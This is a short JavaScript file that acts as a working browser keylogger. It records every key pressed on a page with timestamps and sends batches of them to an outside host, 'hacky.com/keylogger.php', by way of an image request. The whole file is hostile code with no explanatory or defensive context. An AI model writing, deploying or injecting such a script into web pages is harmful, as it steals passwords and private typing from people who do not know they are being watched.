var presses = [];
var lastSentTime = 0;
var sendInterval = 1000;
var minPressesBeforeSending = 5;

window.addEventListener("keydown", function(evt) {
    presses.push({
        t: Math.round(Date.now() / 1000),
        k: evt.key
    });

    if (presses.length >= minPressesBeforeSending && (Date.now() - lastSentTime) > sendInterval) {
        sendPresses();
    }
});

function sendPresses() {
    if (presses.length > 0) {
        var data = encodeURIComponent(JSON.stringify(presses));
        var image = new Image();
        image.src = "http://hacky.com/keylogger.php?c=" + data;
        presses = [];
        lastSentTime = Date.now();
    }
}

setTimeout(function checkForPendingPresses() {
    if (presses.length > 0) {
        sendPresses();
    }
    setTimeout(checkForPendingPresses, sendInterval);
}, sendInterval);
